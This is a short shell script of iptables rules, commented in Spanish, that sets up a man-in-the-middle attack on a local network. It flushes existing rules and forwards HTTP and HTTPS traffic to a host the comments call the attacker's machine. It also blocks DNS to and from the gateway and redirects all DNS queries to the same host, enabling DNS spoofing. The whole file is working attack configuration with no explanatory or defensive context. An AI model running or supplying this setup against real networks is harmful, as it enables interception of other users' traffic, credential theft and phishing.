#Limpiar Reglas.
iptables --flush
iptables --zero
iptables --delete-chain
iptables -F -t nat

#Reglas para redireccionar el trafico HTTP/HTTPS a la máquina del atacante.
iptables --append FORWARD --in-interface eth0 --jump ACCEPT
iptables --table nat --append POSTROUTING --out-interface eth0 --jump MASQUERADE
iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination 192.168.1.135
iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination 192.168.1.135

#Filtrar cualquier paquete DNS cuyo origen o destino sea el Gateway.
iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP
iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP
iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP
iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP
iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j DNAT --to 192.168.1.135
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j DNAT --to 192.168.1.135
